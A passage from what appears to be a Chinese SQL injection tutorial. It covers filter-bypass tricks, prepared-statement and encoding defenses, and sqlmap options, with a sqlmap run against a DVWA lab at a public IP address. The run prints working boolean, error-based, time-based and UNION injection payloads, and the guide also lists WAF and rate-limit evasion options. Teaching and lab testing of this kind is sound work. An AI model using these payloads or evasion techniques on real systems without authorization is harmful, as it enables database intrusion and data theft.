1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)


<span style="color: #b22222;"># </span><span style="color: #b22222;">strcmp(str1, str2)&#27604;&#36739;&#20004;&#20010;&#23383;&#31526;&#20018;&#65292;&#22914;&#26524;&#36825;&#20004;&#20010;&#23383;&#31526;&#20018;&#30456;&#31561;&#36820;&#22238;0&#65307;&#22914;&#20309;&#31532;&#20108;&#20010;&#23383;&#31526;&#23567;&#20110;&#31532;&#19968;&#20010;&#23383;&#31526;&#23601;&#36820;&#22238;1&#65292;&#21453;&#20043;&#36820;&#22238;-1&#12290;</span>
mysql&gt; select left(database(),1);
+--------------------+
| left(database(),1) |
+--------------------+
| d                  |
+--------------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select hex(<span style="color: #8b2252;">'d'</span>);
+----------+
| hex(<span style="color: #8b2252;">'d'</span>) |
+----------+
| 64       |
+----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select strcmp(<span style="color: #8b2252;">'d'</span>,<span style="color: #8b2252;">'d'</span>);
+-----------------+
| strcmp(<span style="color: #8b2252;">'d'</span>,<span style="color: #8b2252;">'d'</span>) |
+-----------------+
|               0 |
+-----------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select strcmp(<span style="color: #8b2252;">'d'</span>,<span style="color: #8b2252;">'a'</span>);
+-----------------+
| strcmp(<span style="color: #8b2252;">'d'</span>,<span style="color: #8b2252;">'a'</span>) |
+-----------------+
|               1 |
+-----------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and strcmp(left(database(),1),0x64);<span style="color: #b22222;">#</span>
Empty set (0.00 sec)
</pre>
</div>

<p>
<b>2、符号</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">and&#21644;or&#26377;&#21487;&#33021;&#19981;&#33021;&#20351;&#29992;&#65292;&#25110;&#32773;&#21487;&#20197;&#35797;&#19979;&amp;&amp;&#21644;||&#33021;&#19981;&#33021;&#29992;&#65307;

=&#19981;&#33021;&#20351;&#29992;&#30340;&#24773;&#20917;&#65292;&#21487;&#20197;&#32771;&#34385;&#23581;&#35797;&lt;&#12289;&gt;&#65292;&#22240;&#20026;&#22914;&#26524;&#19981;&#23567;&#20110;&#21448;&#19981;&#22823;&#20110;&#65292;&#37027;&#23601;&#26159;&#31561;&#20110;&#20102;&#65307;

&#31354;&#26684;&#65292;&#21487;&#20197;&#20351;&#29992;&#22914;&#19979;&#31526;&#21495;&#34920;&#31034;&#20854;&#20316;&#29992;&#65306;%20 %09 %0a %0b %0c %0d %a0 /**/&#12290;
</pre>
</div>

<p>
范例：注入中类空格ascii码
</p>
<div class="org-src-container">
<pre class="src src-sh">Oct   Dec   Hex   Char
011   9     09    HT  <span style="color: #8b2252;">'\t'</span> (horizontal tab&#27700;&#24179;&#21046;&#34920;&#31526;)
012   10    0A    LF  <span style="color: #8b2252;">'\n'</span> (new line&#25442;&#34892;&#38190;)
013   11    0B    VT  <span style="color: #8b2252;">'\v'</span> (vertical tab&#22402;&#30452;&#21046;&#34920;&#31526;)
014   12    0C    FF  <span style="color: #8b2252;">'\f'</span> (form feed&#25442;&#39029;&#38190;)
015   13    0D    CR  <span style="color: #8b2252;">'\r'</span> (carriage ret&#22238;&#36710;&#38190;)
040   32    20    SPACE   (&#31354;&#26684;)
160   0240  A0    Non-breaking space
</pre>
</div>
</div>
</div>
<div id="outline-container-h:3ebd8964-e263-474c-aef3-c74be86cd609" class="outline-4">
<h4 id="h:3ebd8964-e263-474c-aef3-c74be86cd609">特殊符号</h4>
<div class="outline-text-4" id="text-h:3ebd8964-e263-474c-aef3-c74be86cd609">
<p>
这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多。
</p>

<div class="org-src-container">
<pre class="src src-sh">1.&#20351;&#29992;&#21453;&#24341;&#21495;<span style="color: #ff00ff;">`&#65292;&#20363;&#22914;select first_name from`</span>users<span style="color: #ff00ff;">`; &#21487;&#20197;&#29992;&#26469;&#36807;&#31354;&#26684;&#21644;&#27491;&#21017;&#65292;&#29305;&#27530;&#24773;&#20917;&#19979;&#36824;&#21487;&#20197;&#23558;&#20854;&#20570;&#27880;&#37322;&#31526;&#29992;</span>

<span style="color: #ff00ff;">2.&#31070;&#22855;&#30340;"-+."&#65292;select+user_id-1+1.from users; &#8220;+&#8221;&#26159;&#29992;&#20110;&#23383;&#31526;&#20018;&#36830;&#25509;&#30340;&#65292;&#8221;-&#8221;&#21644;&#8221;.&#8221;&#22312;&#27492;&#20063;&#29992;&#20110;&#36830;&#25509;&#65292;&#21487;&#20197;&#36867;&#36807;&#31354;&#26684;&#21644;&#20851;&#38190;&#23383;&#36807;&#28388;</span>

<span style="color: #ff00ff;">3.@&#31526;&#21495;&#65292;select@^1.from users; @&#29992;&#20110;&#21464;&#37327;&#23450;&#20041;&#22914;@var_name&#65292;&#19968;&#20010;@&#34920;&#31034;&#29992;&#25143;&#23450;&#20041;&#65292;@@&#34920;&#31034;&#31995;&#32479;&#21464;&#37327;</span>

<span style="color: #ff00ff;">4.Mysql function() as xxx &#20063;&#21487;&#19981;&#29992;as&#21644;&#31354;&#26684; select-count(user_id)test from users; //&#32469;&#36807;&#31354;&#26684;&#38480;&#21046;</span>
</pre>
</div>

<p>
可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到
</p>

<p>
部分可能发挥大作用的字符： <code>`、~、!、@、%、()、[]、.、-、+ 、|、%00</code>
</p>

<p>
最后在给出一些和这些字符多少有点关系的操作符供参考：
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:9943ce9a-f6f3-4557-8201-d5e2cf89cdfe" class="outline-3">
<h3 id="h:9943ce9a-f6f3-4557-8201-d5e2cf89cdfe">SQL注入防御</h3>
<div class="outline-text-3" id="text-h:9943ce9a-f6f3-4557-8201-d5e2cf89cdfe">
</div>
<div id="outline-container-h:02cff992-3a0d-4847-a399-4021035779b5" class="outline-4">
<h4 id="h:02cff992-3a0d-4847-a399-4021035779b5">预编译和绑定变量</h4>
<div class="outline-text-4" id="text-h:02cff992-3a0d-4847-a399-4021035779b5">
<p>
采用sql语句预编译和绑定变量，是防御sql注入的最佳方法
</p>
<div class="org-src-container">
<pre class="src src-sql">String <span style="color: #a020f0;">sql</span> = "<span style="color: #a020f0;">select</span> id, num <span style="color: #a020f0;">from</span> <span style="color: #483d8b;">user</span> <span style="color: #a020f0;">where</span> id=?"; //&#23450;&#20041;<span style="color: #a020f0;">SQL</span>&#35821;&#21477;
    PreparedStatement ps = conn.prepareStatement(<span style="color: #a020f0;">sql</span>);
    ps.setInt(1, id); //&#35774;&#32622;&#21464;&#37327;
    ps.executeQuery(); //&#25191;&#34892;
</pre>
</div>

<p>
如上所示，就是典型的采用sql语句预编译和绑定变量 。为什么这样就可以防止sql 注入呢？
</p>

<p>
其原因就是：采用了PreparedStatement，就会将sql语句："select id, num from user where id=?" 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的语法结构了，因为语法分析已经完成，语义已经确定了。而语法分析主要是分析sql命令，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行，必须先得通过语法分析，生成执行计划。既然语法分析已经完成，已经预编译过了，那么后面输入的内容只会被当做字符串字面值参数来执行，是绝对不可能作为sql命令来执行的。所以sql语句预编译可以防御sql注入。
</p>
</div>
</div>
<div id="outline-container-h:72ca7ca7-50b8-4d46-aec1-c6340f5678b6" class="outline-4">
<h4 id="h:72ca7ca7-50b8-4d46-aec1-c6340f5678b6">严格检查参数的数据类型，使用安全函数</h4>
<div class="outline-text-4" id="text-h:72ca7ca7-50b8-4d46-aec1-c6340f5678b6">
<p>
严格检查参数的数据类型，还可以使用一些安全函数
</p>

<p>
并非所有场景都能够采用sql语句预编译，有一些场景必须的采用字符串拼接的方式，此时，我们严格检查参数的数据类型，还有可以使用一些安全函数，来防止sql注入。
</p>

<div class="org-src-container">
<pre class="src src-sh">&#27604;&#22914; String sql = <span style="color: #8b2252;">"select id,no from user where id="</span> + id;
</pre>
</div>

<p>
在接收到用户输入的参数时，我们就严格检查 id，只能是int型。复杂情况可以使用正则表达式来判断，这样也是可以防止sql注入的。
</p>

<p>
安全函数的使用，比如：
</p>

<div class="org-src-container">
<pre class="src src-sh">MySQLCodec codec = new MySQLCodec(Mode.STANDARD);
name = ESAPI.encoder().encodeForSQL(codec, name);
String sql = <span style="color: #8b2252;">"select id,no from user where name="</span> + name;
</pre>
</div>

<p>
ESAPI.encoder().encodeForSQL(codec, name) 该函数会将 name 中包含的一些特殊字符进行编码，这样 sql 引擎就不会将name中的字符串当成 sql命令来进行语法分析了。
</p>

<p>
注：实际项目中，一般我们都是采用各种的框架，比如ibatis, hibernate,mybatis等等。它们一般也默认就是sql预编译的。对于ibatis/mybatis，如果使用的是 #{name}形式的，那么就是sql预编译，使用${name} 形式的，就不是sql预编译的。
</p>

<ul class="org-ul">
<li>JAVA_ORM框架：ibatis, hibernate, mybatis</li>
<li>PYTHON_ORM框架：SQLAlchemy，Flask-SQLAlchemy</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:ae7adde2-df12-4b82-8330-781d91644a08" class="outline-3">
<h3 id="h:ae7adde2-df12-4b82-8330-781d91644a08">SQLmap使用</h3>
<div class="outline-text-3" id="text-h:ae7adde2-df12-4b82-8330-781d91644a08">
<p>
官方网站：<a href="http://sqlmap.org/">http://sqlmap.org/</a>
</p>
</div>
<div id="outline-container-h:a5a30707-4a81-4e3d-9dd9-6077cd45df9b" class="outline-4">
<h4 id="h:a5a30707-4a81-4e3d-9dd9-6077cd45df9b">SQLmap简介</h4>
<div class="outline-text-4" id="text-h:a5a30707-4a81-4e3d-9dd9-6077cd45df9b">
<p>
Sqlmap是一款开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。
</p>

<p>
它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。
</p>

<p>
sqlmap支持的数据库有：
</p>
<ul class="org-ul">
<li>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, ClickHouse等</li>
</ul>

<p>
sqlmap支持五种不同的注入模式：
</p>
<ol class="org-ol">
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
<li>联合查询注入，可以使用union的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>

<p>
支持python版本：2.6, 2.7 and 3.x 
</p>
</div>
</div>
<div id="outline-container-h:624806d9-c952-46cb-84c0-d143d4b8ad15" class="outline-4">
<h4 id="h:624806d9-c952-46cb-84c0-d143d4b8ad15">下载及安装</h4>
<div class="outline-text-4" id="text-h:624806d9-c952-46cb-84c0-d143d4b8ad15">
<p>
（1）Linux下git直接安装
</p>
<div class="org-src-container">
<pre class="src src-sh">git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py --update <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26356;&#26032;</span>
python sqlmap.py -hh <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#24110;&#21161;&#20449;&#24687;</span>
</pre>
</div>

<p>
（2）Windows下安装
</p>

<p>
windows下下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。
</p>

<p>
下载地址：<a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a>
</p>

<ol class="org-ol">
<li>将sqlmap压缩包解压到python安装目录下，复制好sqlmap目录路径。如 D:\Program Files\Python\python3130\sqlmap</li>
<li>桌面新建快捷方式，对象位置输入cmd，快捷方式名称sqlmap，保存</li>
<li>右键sqlmap快捷方式点击属性，在"起始位置"修改为sqlmap安装目录路径，确定</li>
<li>双击打开sqlmap快捷方式，输入sqlmap.py验证</li>
</ol>

<p>
（3）Kali默认安装sqlmap
</p>
</div>
</div>
<div id="outline-container-h:73ad35d1-7289-4252-9f9f-d0fbcc073d0c" class="outline-4">
<h4 id="h:73ad35d1-7289-4252-9f9f-d0fbcc073d0c">参数详解</h4>
<div class="outline-text-4" id="text-h:73ad35d1-7289-4252-9f9f-d0fbcc073d0c">
<p>
官方文档：<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a>
</p>
</div>
<div id="outline-container-h:753dd42f-d650-4c1f-a75a-8e008c9da6e8" class="outline-5">
<h5 id="h:753dd42f-d650-4c1f-a75a-8e008c9da6e8">Target：目标</h5>
<div class="outline-text-5" id="text-h:753dd42f-d650-4c1f-a75a-8e008c9da6e8">
<div class="org-src-container">
<pre class="src src-sh">-u URL, --url=URL &#30446;&#26631;URL (e.g.<span style="color: #8b2252;">"http://www.site.com/vuln.php?id=1"</span>)&#65292;&#20351;&#29992;-u&#25110;&#32773;-
-url
-d DIRECT &#30452;&#25509;&#36830;&#25509;&#25968;&#25454;&#24211;&#30340;&#36830;&#25509;&#23383;&#31526;&#20018;
-l LOGFILE &#20174;Burp&#25110;&#32773;WebScarab&#20195;&#29702;&#26085;&#24535;&#25991;&#20214;&#20013;&#20998;&#26512;&#30446;&#26631;
-x SITEMAPURL &#20174;&#36828;&#31243;&#32593;&#31449;&#22320;&#22270;&#65288;sitemap.xml&#65289;&#25991;&#20214;&#26469;&#35299;&#26512;&#30446;&#26631;
-m BULKFILE &#23558;&#30446;&#26631;&#22320;&#22336;&#20445;&#23384;&#22312;&#25991;&#20214;&#20013;&#65292;&#19968;&#34892;&#20026;&#19968;&#20010;URL&#22320;&#22336;&#36827;&#34892;&#25209;&#37327;&#26816;&#27979;&#12290;
-g GOOGLEDORK &#20174;&#35895;&#27468;&#20013;&#21152;&#36733;&#32467;&#26524;&#30446;&#26631;URL&#65288;&#21482;&#33719;&#21462;&#21069;100&#20010;&#32467;&#26524;&#65292;&#38656;&#35201;&#25346;&#20195;&#29702;&#65289;
-c CONFIGFILE &#20174;&#37197;&#32622;ini&#25991;&#20214;&#20013;&#21152;&#36733;&#36873;&#39033;
-r REQUESTFILE &#20174;&#25991;&#20214;&#21152;&#36733;HTTP&#35831;&#27714;&#65292;sqlmap&#21487;&#20197;&#20174;&#19968;&#20010;&#25991;&#26412;&#25991;&#20214;&#20013;&#33719;&#21462;HTTP&#35831;&#27714;&#65292;&#36825;&#26679;&#23601;&#21487;

&#20197;&#36339;&#36807;&#35774;&#32622;&#19968;&#20123;&#20854;&#20182;&#21442;&#25968;&#65288;&#27604;&#22914;cookie&#65292;POST&#25968;&#25454;&#65292;&#31561;&#31561;&#65289;&#65292;&#35831;&#27714;&#26159;HTTPS&#30340;&#26102;&#38656;&#35201;&#37197;&#21512;&#36825;&#20010;--forcessl&#21442;&#25968;&#26469;&#20351;&#29992;&#65292;&#25110;&#32773;&#21487;&#20197;&#22312;Host&#22836;&#21518;&#38376;&#21152;&#19978;:443
</pre>
</div>

<p>
<b>目标URL</b>
</p>

<p>
参数：-u或者&#x2013;url
</p>

<p>
格式：http(s)://targeturl[:port]/[…]
</p>

<p>
例如：python sqlmap.py -u "<a href="http://www.target.com/vuln.php?id=1">http://www.target.com/vuln.php?id=1</a>" -f &#x2013;banner &#x2013;dbs &#x2013;users
</p>

<p>
注意：-u 时url需要带参数sqlmap才能识别在哪里注入。
</p>


<p>
范例：使用sqlmap
</p>

<p>
靶场dvwa, 安全等级Low, 进入SQL Injection, 输入1。利用burpsuite抓包
</p>

<pre class="example" id="org034c273">
124.222.171.19:8081/vulnerabilities/sqli/?id=1&amp;Submit=Submit
</pre>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"124.222.171.19:8081/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span>
&#36339;&#36716;&#21040;&#30331;&#24405;&#39029;&#38754;&#65292;&#26159;&#21542;&#32487;&#32493;&#65311;&#26159;
got a 302 redirect to <span style="color: #8b2252;">'http://124.222.171.19:8081/login.php'</span>. Do you want to follow? [Y/n] y
y
y
[CRITICAL] all tested parameters<span style="color: #a020f0;"> do</span> not appear to be injectable. Try to increase values for <span style="color: #8b2252;">'--level'</span>/<span style="color: #8b2252;">'--risk'</span> options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option <span style="color: #8b2252;">'--tamper'</span> (e.g. <span style="color: #8b2252;">'--tamper=space2comment'</span>) and/or switch <span style="color: #8b2252;">'--random-agent'</span>
</pre>
</div>
<p>
最后发现所有测试参数似乎都不可注入，这里我们需要登录的cookie
</p>

<p>
cooki 获取方法
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;1&#65306;&#27983;&#35272;&#22120;&#25511;&#21046;&#21488;</span>
document.cookie
<span style="color: #8b2252;">"PHPSESSID=5hmt2o85fg2kqaajflpblim6l2; security=low"</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;2&#65306;F12</span>
Network&#20013;&#26597;header&#22836;
Cookie: <span style="color: #a0522d;">PHPSESSID</span>=5hmt2o85fg2kqaajflpblim6l2; <span style="color: #a0522d;">security</span>=low

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;3&#65306;burp suite &#25235;&#21253;</span>
</pre>
</div>

<p>
继续注入
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt; python sqlmap.py -u <span style="color: #8b2252;">"124.222.171.19:8081/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> --cookie <span style="color: #8b2252;">"PHPSESSID=5hmt2o85fg2kqaajflpblim6l2; security=low"</span>

&#21457;&#29616;&#22823;&#27010;&#24565;&#26159;mysql&#25968;&#25454;&#24211;&#65292;&#26159;&#21542;&#36339;&#36807;&#20854;&#23427;&#24211;&#31867;&#22411;&#26597;&#35810;&#65311;&#26159;
it looks like the back-end DBMS is <span style="color: #8b2252;">'MySQL'</span>. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
&#27979;&#35797;&#31561;&#32423;&#21644;&#39118;&#38505;&#31561;&#32423;
<span style="color: #a020f0;">for</span> the remaining tests,<span style="color: #a020f0;"> do</span> you want to include all tests for <span style="color: #8b2252;">'MySQL'</span> extending provided level (1) and risk (1) values? [Y/n] y
... ...

sqlmap identified the following injection point(s) with a total of 2333 HTTP(s) requests:
---
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21457;&#29616;&#28431;&#27934;</span>
Parameter: id (GET)
    Type: boolean-based blind  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24067;&#23572;&#30450;&#27880;</span>
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: <span style="color: #a0522d;">id</span>=1<span style="color: #8b2252;">' OR NOT 8630=8630#&amp;Submit=Submit</span>

<span style="color: #8b2252;">    Type: error-based #&#25253;&#38169;&#27880;&#20837;</span>
<span style="color: #8b2252;">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span>
<span style="color: #8b2252;">    Payload: id=1'</span> AND (SELECT 4701 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (ELT(<span style="color: #a0522d;">4701</span>=4701,1))),0x7171767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tYpA&amp;<span style="color: #a0522d;">Submit</span>=Submit

    Type: time-based blind <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26102;&#38388;&#30450;&#27880;</span>
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: <span style="color: #a0522d;">id</span>=1<span style="color: #8b2252;">' AND (SELECT 5274 FROM (SELECT(SLEEP(5)))wHBr)-- pyai&amp;Submit=Submit</span>

<span style="color: #8b2252;">    Type: UNION query #&#32852;&#21512;&#26597;&#35810;</span>
<span style="color: #8b2252;">    Title: MySQL UNION query (NULL) - 2 columns</span>
<span style="color: #8b2252;">    Payload: id=1'</span> UNION ALL SELECT CONCAT(0x7162767171,0x4961695a4d685a6c6e55764a5a554a566d597874625662654553686e7377794c767864766d6e7472,0x7171767671),NULL#&amp;<span style="color: #a0522d;">Submit</span>=Submit
---

[23:46:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL &gt;= 5.0.12

&#19978;&#38754;&#26159;&#25195;&#25551;&#32467;&#26524;&#65292;&#32473;&#20986;&#20102;&#27880;&#20837;&#28857;&#65292;&#21644;&#31995;&#32479;&#21450;&#26381;&#21153;&#29256;&#26412;

</pre>
</div>



<p>
<b>从Burp或者WebScarab代理中获取日志</b>
</p>

<ul class="org-ul">
<li>参数：-l</li>
<li>可以直接吧Burp proxy或者WebScarab proxy中的日志直接导出来交给sqlmap来一个一个检测是否有注入。</li>
</ul>

<p>
<b>从文本中获取多个目标扫描</b>
</p>
<ul class="org-ul">
<li>参数：-m</li>
<li>文件中保存url格式如下，sqlmap会一个一个检测</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">www.xxx1.com/vuln1.php?<span style="color: #a0522d;">q</span>=student
www.xxx2.com/vuln2.asp?<span style="color: #a0522d;">id</span>=1
www.xxx3.com/vuln3/id/1*
</pre>
</div>

<p>
<b>从文件中加载HTTP请求</b>
</p>
<ul class="org-ul">
<li>参数：-r</li>
<li>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</li>
</ul>

<p>
比如文本文件内如下：
</p>
<div class="org-src-container">
<pre class="src src-sh">POST/students.php HTTP/1.1
Host:www.xxx.com
User-Agent:Mozilla/4.0
<span style="color: #a0522d;">id</span>=1
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -r 1.txt
</pre>
</div>

<p>
当请求是HTTPS的时候，需要配合&#x2013;force-ssl参数来使用，或者可以在Host头后面加上:443
</p>
</div>
</div>
<div id="outline-container-h:fa848a7e-4d2b-468a-8d25-de4f301bb150" class="outline-5">
<h5 id="h:fa848a7e-4d2b-468a-8d25-de4f301bb150">Request：请求设置</h5>
<div class="outline-text-5" id="text-h:fa848a7e-4d2b-468a-8d25-de4f301bb150">
<div class="org-src-container">
<pre class="src src-sh">--method&#65306;&#25351;&#23450;&#35831;&#27714;&#26041;&#27861;
--data&#65306;&#25226;&#25968;&#25454;&#20197;POST&#26041;&#24335;&#25552;&#20132;
--param&#65306;&#24403;GET&#25110;POST&#30340;&#25968;&#25454;&#38656;&#35201;&#29992;&#20854;&#20182;&#23383;&#31526;&#20998;&#21106;&#27979;&#35797;&#21442;&#25968;&#30340;&#26102;&#20505;&#38656;&#35201;&#29992;&#21040;&#27492;&#21442;&#25968;
--cookie&#65306;&#35774;&#32622;cookie&#65292;&#25552;&#20132;&#35831;&#27714;&#30340;&#26102;&#20505;&#38468;&#24102;&#25152;&#35774;&#32622;&#30340;cookie
--load-cookies&#65306;&#20174;&#25991;&#20214;&#33719;&#21462;cookie
--user-agent&#65306;&#21487;&#20197;&#20351;&#29992;&#8211;user-anget&#21442;&#25968;&#26469;&#20462;&#25913;
--headers&#65306;&#21487;&#20197;&#36890;&#36807;&#8211;headers&#21442;&#25968;&#26469;&#22686;&#21152;&#39069;&#22806;&#30340;http&#22836;
--proxy&#65306;&#35774;&#32622;&#20195;&#29702;&#65292;&#21487;&#20197;&#36991;&#20813;&#26412;&#26426;&#22320;&#22336;&#34987;&#23553;&#31105;
--delay&#65306;&#21487;&#20197;&#35774;&#23450;&#20004;&#20010;HTTP(S)&#35831;&#27714;&#38388;&#30340;&#24310;&#36831; &#38450;&#27490;&#21457;&#36865;&#36807;&#24555;&#23548;&#33268;&#34987;&#23553;ip
--random-agent&#65306;&#20351;&#29992;&#8211;random-agnet&#21442;&#25968;&#26469;&#38543;&#26426;&#30340;&#20174;./txt/user-agents.txt&#20013;&#33719;&#21462;&#12290;&#24403;&#8211;level&#21442;&#25968;&#35774;&#23450;&#20026;3&#25110;&#32773;3&#20197;&#19978;&#30340;&#26102;&#20505;&#65292;&#20250;&#23581;&#35797;&#23545;User-Angent&#36827;&#34892;&#27880;&#20837;&#12290;
--referer&#65306;&#22312;&#35831;&#27714;&#30446;&#26631;&#30340;&#26102;&#20505;&#21487;&#20197;&#33258;&#24049;&#20266;&#36896;&#35831;&#27714;&#21253;&#20013;&#30340;referer
&#8211;-level&#21442;&#25968;&#35774;&#23450;&#20026;3&#25110;&#32773;3&#20197;&#19978;&#30340;&#26102;&#20505;&#20250;&#23581;&#35797;&#23545;referer&#27880;&#20837;&#12290;
</pre>
</div>

<p>
参数：&#x2013;data
</p>
<ul class="org-ul">
<li>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST参数。</li>
</ul>

<p>
例子：
</p>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"http://www.xxx.com/students.php"</span> --data=<span style="color: #8b2252;">"id=1"</span> -f --banner --dbs --users
</pre>
</div>

<p>
<b>利用正则过滤目标网址</b>
</p>

<p>
参数：&#x2013;scope
</p>

<p>
例如：加载burp suite的历史日志，匹配指定的域名来注入
</p>
<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -l burp_http.log --scope=<span style="color: #8b2252;">"(www)?\.target\.(com|net|org)"</span>
</pre>
</div>

<p>
<b>避免过多的错误请求被屏蔽</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;safe-url,&#x2013;safe-freq</li>
<li>有的web应用程序会在你多次发送访问错误的请求时屏蔽掉你之后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致后续无法进行测试。</li>
</ul>

<p>
绕过这个策略有两种方式：
</p>
<div class="org-src-container">
<pre class="src src-sh">--safe-url&#65306;&#25552;&#20379;&#19968;&#20010;&#23433;&#20840;&#19981;&#38169;&#35823;&#30340;&#38142;&#25509;&#65292;&#27599;&#38548;&#19968;&#27573;&#26102;&#38388;&#37117;&#20250;&#21435;&#35775;&#38382;&#19968;&#19979;&#12290;
--safe-freq&#65306;&#25552;&#20379;&#19968;&#20010;&#23433;&#20840;&#19981;&#38169;&#35823;&#30340;&#38142;&#25509;&#65292;&#27599;&#27425;&#27979;&#35797;&#35831;&#27714;&#20043;&#21518;&#37117;&#20250;&#20877;&#35775;&#38382;&#19968;&#36941;&#23433;&#20840;&#38142;&#25509;&#12290;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:f64312b2-09cd-4c62-9c71-24f39096a11c" class="outline-5">
<h5 id="h:f64312b2-09cd-4c62-9c71-24f39096a11c">Optimization：优化</h5>
<div class="outline-text-5" id="text-h:f64312b2-09cd-4c62-9c71-24f39096a11c">
<p>
-o 开启所有优化开关。工作中几乎用不到
</p>
</div>
</div>
<div id="outline-container-h:102608f0-dc16-460c-9ddd-a2eca3b71d7d" class="outline-5">
<h5 id="h:102608f0-dc16-460c-9ddd-a2eca3b71d7d">Injection：注入</h5>
<div class="outline-text-5" id="text-h:102608f0-dc16-460c-9ddd-a2eca3b71d7d">
<div class="org-src-container">
<pre class="src src-sh">-p&#65306;&#35774;&#32622;&#24819;&#35201;&#27979;&#35797;&#30340;&#21442;&#25968;
--skip&#65306;&#19981;&#24819;&#35201;&#27979;&#35797;&#30340;&#21442;&#25968;&#21487;&#20197;&#36890;&#36807; skip&#35774;&#32622;&#36339;&#36807;
--dbms&#65306;&#25351;&#23450;&#25968;&#25454;&#24211; &#33410;&#30465;sqlmap&#33258;&#24049;&#26816;&#27979;&#30340;&#26102;&#38388;
--os&#65306;&#25351;&#23450;&#25968;&#25454;&#24211;&#26381;&#21153;&#31995;&#32479; &#33410;&#30465;sqlmap&#33258;&#24049;&#26816;&#27979;&#30340;&#26102;&#38388;
--tamper&#65306;&#20351;&#29992;sqlmap&#33258;&#24102;&#30340;tamper&#65288;&#33050;&#26412;&#65289;&#65292;&#25110;&#32773;&#33258;&#24049;&#20889;&#30340;tamper&#65292;&#26469;&#28151;&#28102;payload&#65292;&#36890;&#24120;&#29992;&#26469;&#32469;&#36807;waf&#21644;ips&#12290;
</pre>
</div>

<p>
<b>测试参数</b>
</p>

<p>
参数：-p, &#x2013;skip
</p>

<p>
sqlmap默认测试所有的GET和POST参数，当&#x2013;level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。
</p>
<ul class="org-ul">
<li>例如： -p "id,user-anget"</li>
</ul>

<p>
当你使用&#x2013;level的值很大但是有个别参数不想测试的时候可以使用&#x2013;skip参数。
</p>
<ul class="org-ul">
<li>例如：&#x2013;skip="user-agent,referer"</li>
</ul>

<p>
在有些时候web服务器使用了伪静态，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*
</p>
